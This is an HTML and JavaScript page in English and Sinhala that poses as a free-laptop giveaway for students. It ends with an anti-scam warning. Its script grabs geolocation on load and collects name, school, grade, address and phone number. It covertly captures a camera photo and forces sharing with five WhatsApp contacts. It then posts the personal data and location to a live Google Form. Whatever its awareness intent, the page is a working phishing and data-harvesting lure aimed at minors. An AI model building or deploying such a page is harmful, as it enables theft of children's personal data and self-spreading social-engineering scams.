<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Win a Free Laptop - Artha Education</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      margin: 0; padding: 0;
      background: #f5f5f5;
      text-align: center;
    }
    .container {
      max-width: 500px;
      margin: 2rem auto;
      padding: 2rem;
      background: white;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
    }
    img.logo {
      width: 100px;
      margin-bottom: 1rem;
    }
    h1, h2 {
      color: #e91e63;
    }
    label {
      display: block;
      margin: 0.5rem 0 0.2rem;
    }
    input {
      padding: 0.5rem;
      width: 100%;
      margin-bottom: 1rem;
    }
    button {
      padding: 0.75rem 1.5rem;
      background: #2196f3;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 1rem;
    }
    .hidden {
      display: none !important;
    }
    .final-message {
      display: none;
    }
    #map {
      width: 100%;
      height: 200px;
      margin-top: 1rem;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="container" id="step1">
    <img src="Artha.jpg" alt="Artha Logo" class="logo" />
    <h1>üéÅ Win a Free Laptop! / üéÅ ‡∂±‡∑ú‡∂∏‡∑í‡∂Ω‡∑ö ‡∂Ω‡∑ê‡∂¥‡∑ä‡∂ß‡∑ú‡∂¥‡∑ä ‡∂Ø‡∑í‡∂±‡∑è‡∂ú‡∂±‡∑ä‡∂±!</h1>
    <p>Congratulations! You have been selected by <strong>Artha Education Institute ‚Äì Katulanda</strong>.<br>‡∑É‡∑î‡∂∑ ‡∂¥‡∂≠‡∂∏‡∑î! ‡∂î‡∂∂ ‡∂≠‡∑ö‡∂ª‡∑ì ‡∂¥‡∂≠‡∑ä‡∑Ä‡∑ì ‡∂á‡∂≠ <strong>‡∂Ö‡∂ª‡∑ä‡∂Æ‡∑è ‡∂Ö‡∂∞‡∑ä‚Äç‡∂∫‡∑è‡∂¥‡∂± ‡∂Ü‡∂∫‡∂≠‡∂±‡∂∫ ‚Äì ‡∂ö‡∂ß‡∑î‡∂Ω‡∂±‡∑ä‡∂Ø</strong>.</p>
    <form id="userForm">
      <label>Name / ‡∂±‡∂∏:</label>
      <input type="text" id="name" required />
      <label>Grade / ‡∑Å‡∑ä‚Äç‡∂ª‡∑ö‡∂´‡∑í‡∂∫:</label>
      <input type="text" id="grade" required />
      <label>School / ‡∂¥‡∑è‡∑É‡∂Ω:</label>
      <input type="text" id="school" required />
      <label>Address / ‡∂Ω‡∑í‡∂¥‡∑í‡∂±‡∂∫:</label>
      <input type="text" id="address" required />
      <label>Contact No / ‡∂Ø‡∑î‡∂ª‡∂ö‡∂Æ‡∂± ‡∂Ö‡∂Ç‡∂ö‡∂∫:</label>
      <input type="text" id="contactno" required />
      <button type="button" onclick="nextStep()">Next / ‡∂ä‡∑Ö‡∂ü‡∂ß</button>
    </form>
  </div>

  <div class="container" id="step2" style="display:none;">
    <h2>üì∑ Automatic Photo Capture / ‡∑É‡∑ä‡∑Ä‡∂∫‡∂Ç‡∂ö‡∑ä‚Äç‡∂ª‡∑ì‡∂∫ ‡∂°‡∑è‡∂∫‡∑è‡∂ª‡∑ñ‡∂¥ ‡∂ú‡∑ä‚Äç‡∂ª‡∑Ñ‡∂´‡∂∫</h2>
    <p>This site will automatically capture a photo for verification. Please allow camera permission.<br>‡∑É‡∂≠‡∑ä‚Äç‡∂∫‡∑è‡∂¥‡∂± ‡∑É‡∂≥‡∑Ñ‡∑è ‡∑É‡∑ä‡∑Ä‡∂∫‡∂Ç‡∂ö‡∑ä‚Äç‡∂ª‡∑ì‡∂∫‡∑Ä ‡∂°‡∑è‡∂∫‡∑è‡∂ª‡∑ñ‡∂¥ ‡∂ú‡∑ä‚Äç‡∂ª‡∑Ñ‡∂´‡∂∫ ‡∂ö‡∑ô‡∂ª‡∑ö. ‡∂ö‡∂ª‡∑î‡∂´‡∑è‡∂ö‡∂ª ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è ‡∂Ö‡∑Ä‡∑É‡∂ª ‡∂Ø‡∑ô‡∂±‡∑ä‡∂±.</p>
    <!-- Hidden video and canvas -->
    <video id="video" autoplay class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>
  </div>

  <div class="container" id="step3" style="display:none;">
    <h2>üì≤ Share with 5 WhatsApp Contacts / WhatsApp ‡∂∏‡∑í‡∂≠‡∑î‡∂ª‡∂±‡∑ä 5 ‡∂Ø‡∑ô‡∂±‡∑ô‡∂ö‡∑î‡∂ß ‡∂∂‡∑ô‡∂Ø‡∑è ‡∑Ñ‡∂Ø‡∑è ‡∂ú‡∂±‡∑ä‡∂±</h2>
    <p>To receive your gift, share this with 5 WhatsApp friends:<br>‡∂î‡∂∂‡∑ö ‡∂≠‡∑ë‡∂ú‡∑ä‡∂ú ‡∂Ω‡∂∂‡∑è ‡∂ú‡∑ê‡∂±‡∑ì‡∂∏‡∂ß WhatsApp ‡∂∏‡∑í‡∂≠‡∑î‡∂ª‡∂±‡∑ä 5 ‡∂Ø‡∑ô‡∂±‡∑ô‡∂ö‡∑î‡∂ß ‡∂∏‡∑ô‡∂∏ ‡∂Ω‡∑í‡∂¥‡∑í‡∂∫ ‡∂∂‡∑ô‡∂Ø‡∑è ‡∑Ñ‡∂Ø‡∑è ‡∂ú‡∂±‡∑ä‡∂±:</p>
    <p><strong>"üéÅ I just claimed a laptop from Artha Institute! You can too! / ‡∂∏‡∂∏ ‡∂Ö‡∂ª‡∑ä‡∂Æ‡∑è ‡∂Ü‡∂∫‡∂≠‡∂±‡∂∫‡∑ô‡∂±‡∑ä ‡∂Ω‡∑ê‡∂¥‡∑ä‡∂ß‡∑ú‡∂¥‡∑ä ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂Ø‡∑í‡∂±‡∂Ω‡∑è! ‡∂î‡∂∂‡∂ß‡∂≠‡∑ä ‡∂¥‡∑î‡∑Ö‡∑î‡∑Ä‡∂±‡∑ä!"</strong></p>
    <button id="shareBtn" onclick="shareWhatsApp()">Share on WhatsApp / WhatsApp ‡∂∂‡∑ô‡∂Ø‡∑è ‡∑Ñ‡∂Ø‡∑è ‡∂ú‡∂±‡∑ä‡∂±</button>
    <p>Shared: <span id="shareCount">0</span>/5</p>
  </div>

  <div class="container final-message" id="final" style="display:none;">
    <h2>üö® Don't Fall for Online Scams! / ‡∂Ö‡∂±‡∑ä‡∂≠‡∂ª‡∑ä‡∂¢‡∑è‡∂Ω ‡∑Ä‡∂Ç‡∂†‡∑è ‡∑Ä‡∂Ω‡∂ß ‡∂∂‡∑í‡∂∫‡∑Ä‡∑ô‡∂±‡∑ä‡∂± ‡∂ë‡∂¥‡∑è!</h2>
    <p>You entered / ‡∂î‡∂∂ ‡∂á‡∂≠‡∑î‡∂Ω‡∑ä ‡∂ö‡∑Ö‡∑ö:</p>
    <ul>
      <li><strong>Name / ‡∂±‡∂∏:</strong> <span id="showName"></span></li>
      <li><strong>Grade / ‡∑Å‡∑ä‚Äç‡∂ª‡∑ö‡∂´‡∑í‡∂∫:</strong> <span id="showGrade"></span></li>
      <li><strong>School / ‡∂¥‡∑è‡∑É‡∂Ω:</strong> <span id="showSchool"></span></li>
      <li><strong>Address / ‡∂Ω‡∑í‡∂¥‡∑í‡∂±‡∂∫:</strong> <span id="showAddress"></span></li>
      <li><strong>Contact No / ‡∂Ø‡∑î‡∂ª‡∂ö‡∂Æ‡∂± ‡∂Ö‡∂Ç‡∂ö‡∂∫:</strong> <span id="showContactno"></span></li>
      <li><strong>Location / ‡∂¥‡∑í‡∑Ñ‡∑í‡∂ß‡∑ì‡∂∏:</strong> <span id="showLocation"></span></li>
    </ul>
    <p>You shared your <strong>photo</strong> with a fake offer.<br>‡∂î‡∂∂‡∑ö ‡∂°‡∑è‡∂∫‡∑è‡∂ª‡∑ñ‡∂¥‡∂∫ ‡∑Ä‡∂Ç‡∂†‡∑è ‡∂∏‡∂ü‡∑í‡∂±‡∑ä ‡∂∂‡∑ô‡∂Ø‡∑è ‡∑Ñ‡∂Ø‡∑è ‡∂á‡∂≠.</p>
    <canvas id="photoResult" style="width:100%; max-width:400px; border:1px solid #ccc;"></canvas>

    <div id="map"></div>

    <p style="color:red; font-weight:bold;">
      ‚ùå Don‚Äôt enter real details in random surveys!<br>
      ‚úÖ Learn Cyber Safety with Artha Education Institute.<br><br>
      ‚ùå ‡∂Ö‡∑Ñ‡∂π‡∑î ‡∑É‡∂∏‡∑ì‡∂ö‡∑ä‡∑Ç‡∂´ ‡∑Ä‡∂Ω‡∂Ø‡∑ì ‡∂î‡∂∂‡∑ö ‡∑É‡∑ê‡∂∂‡∑ë ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î ‡∂á‡∂≠‡∑î‡∂Ω‡∑ä ‡∂ö‡∂ª‡∂±‡∑ä‡∂± ‡∂ë‡∂¥‡∑è!<br>
      ‚úÖ ‡∂Ö‡∂ª‡∑ä‡∂Æ‡∑è ‡∂Ö‡∂∞‡∑ä‚Äç‡∂∫‡∑è‡∂¥‡∂± ‡∂Ü‡∂∫‡∂≠‡∂±‡∂∫ ‡∑É‡∂∏‡∂ü ‡∑É‡∂∫‡∑í‡∂∂‡∂ª‡∑ä ‡∂Ü‡∂ª‡∂ö‡∑ä‡∑Ç‡∑è‡∑Ä ‡∂â‡∂ú‡∑ô‡∂± ‡∂ú‡∂±‡∑ä‡∂±.
    </p>
  </div>

  <script>
    // Google form url with entries
    const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScPUa7P9wKKkEmwimOmOIhTgIM7u9zhETOYqIURWcerO3s4Dg/formResponse";

    // form fields
    const nameInput = document.getElementById('name');
    const gradeInput = document.getElementById('grade');
    const schoolInput = document.getElementById('school');
    const addressInput = document.getElementById('address');
    const contactInput = document.getElementById('contactno');

    // step containers
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const step3 = document.getElementById('step3');
    const finalStepDiv = document.getElementById('final');

    // video & canvas for camera capture
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const photoResult = document.getElementById('photoResult');

    // share button & counter
    const shareBtn = document.getElementById('shareBtn');
    const shareCountSpan = document.getElementById('shareCount');
    let shareCount = 0;
    const shareTarget = 5;

    // location variables
    let currentLocation = "";
    let latitude = null;
    let longitude = null;

    // move from step1 to step2 and start camera capture automatically
    function nextStep() {
      // Validate inputs here if needed (already required)
      step1.style.display = "none";
      step2.style.display = "block";

      startCameraAndCapture();
    }

    // Start camera, capture photo automatically, then move to step3
    function startCameraAndCapture() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;

          // Wait for video to be ready
          video.onloadedmetadata = () => {
            // Small timeout to ensure video stream is ready
            setTimeout(() => {
              capturePhoto();
              // Stop camera stream immediately after capture
              stream.getTracks().forEach(track => track.stop());
              step2.style.display = "none";
              step3.style.display = "block";
            }, 1000);
          };
        })
        .catch(err => {
          alert('Camera permission denied! / ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è ‡∂Ö‡∑Ä‡∑É‡∂ª ‡∂¥‡∑ä‚Äç‡∂ª‡∂≠‡∑í‡∂ö‡∑ä‡∑Ç‡∑ö‡∂¥ ‡∂ö‡∂ª‡∂± ‡∂Ω‡∂Ø‡∑í!');
          // Go back to step1 so user can retry or quit
          step2.style.display = "none";
          step1.style.display = "block";
        });
    }

    // Capture photo to canvas
    function capturePhoto() {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
    }

    // Share WhatsApp message with counter to ensure 5 shares
    function shareWhatsApp() {
      const message = encodeURIComponent("üéÅ I just claimed a laptop from Artha Institute! You can too! / ‡∂∏‡∂∏ ‡∂Ö‡∂ª‡∑ä‡∂Æ‡∑è ‡∂Ü‡∂∫‡∂≠‡∂±‡∂∫‡∑ô‡∂±‡∑ä ‡∂Ω‡∑ê‡∂¥‡∑ä‡∂ß‡∑ú‡∂¥‡∑ä ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂Ø‡∑í‡∂±‡∂Ω‡∑è! ‡∂î‡∂∂‡∂ß‡∂≠‡∑ä ‡∂¥‡∑î‡∑Ö‡∑î‡∑Ä‡∂±‡∑ä!");
      const whatsappUrl = `https://wa.me/?text=${message}`;

      window.open(whatsappUrl, '_blank');

      shareCount++;
      shareCountSpan.textContent = shareCount;

      if (shareCount >= shareTarget) {
        shareBtn.disabled = true;
        shareBtn.textContent = "Thank you for sharing! / ‡∂∂‡∑ô‡∂Ø‡∑è ‡∑Ñ‡∂Ø‡∑è ‡∂ú‡∑ê‡∂±‡∑ì‡∂∏ ‡∑É‡∂≥‡∑Ñ‡∑è ‡∑É‡∑ä‡∂≠‡∑î‡∂≠‡∑í‡∂∫‡∑í!";
        finalStep();
      }
    }

    // Final step: show all details, photo, map, and submit data to google form
    function finalStep() {
      // Show user input data
      document.getElementById('showName').innerText = nameInput.value;
      document.getElementById('showGrade').innerText = gradeInput.value;
      document.getElementById('showSchool').innerText = schoolInput.value;
      document.getElementById('showAddress').innerText = addressInput.value;
      document.getElementById('showContactno').innerText = contactInput.value;
      document.getElementById('showLocation').innerText = currentLocation || "Not available / ‡∂±‡∑ú‡∂∏‡∑ê‡∂≠";

      // Show photo on final canvas
      const ctx = photoResult.getContext('2d');
      photoResult.width = canvas.width;
      photoResult.height = canvas.height;
      ctx.drawImage(canvas, 0, 0);

      step3.style.display = "none";
      finalStepDiv.style.display = "block";

      // Submit data to Google Form
      submitToGoogleForm();
      
      // Show map if location available
      if(latitude && longitude) {
        showMap(latitude, longitude);
      }
    }

    // Submit user data to Google Form via POST using fetch
    function submitToGoogleForm() {
      const formData = new FormData();
      formData.append('entry.997021349', nameInput.value);
      formData.append('entry.180306948', gradeInput.value);
      formData.append('entry.74488444', schoolInput.value);
      formData.append('entry.377707306', addressInput.value);
      formData.append('entry.1450609673', contactInput.value);
      formData.append('entry.1946665100', currentLocation);

      fetch(googleFormURL, {
        method: 'POST',
        mode: 'no-cors',
        body: formData
      }).catch(err => console.warn('Google Form submission failed', err));
    }

    // Get user location when page loads (or step1 shown)
    function getLocation() {
      if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          latitude = pos.coords.latitude;
          longitude = pos.coords.longitude;
          currentLocation = `Lat: ${latitude.toFixed(5)}, Lon: ${longitude.toFixed(5)}`;
        }, err => {
          currentLocation = "Permission denied / ‡∂Ö‡∑Ä‡∑É‡∂ª ‡∂¥‡∑ä‚Äç‡∂ª‡∂≠‡∑í‡∂ö‡∑ä‡∑Ç‡∑ö‡∂¥‡∂∫‡∑í";
        });
      } else {
        currentLocation = "Geolocation not supported / ‡∂ú‡∑í‡∂´‡∑î‡∂∏‡∑ä ‡∂Ö‡∂±‡∑î‡∂∏‡∂≠ ‡∂±‡∑ê‡∂≠";
      }
    }

    // Show map in #map div using Google Maps iframe
    function showMap(lat, lon) {
      const mapDiv = document.getElementById('map');
      const src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
      mapDiv.innerHTML = `<iframe width="100%" height="200" frameborder="0" style="border:0" src="${src}" allowfullscreen></iframe>`;
    }

    // Start by getting location
    getLocation();
  </script>
</body>
</html>
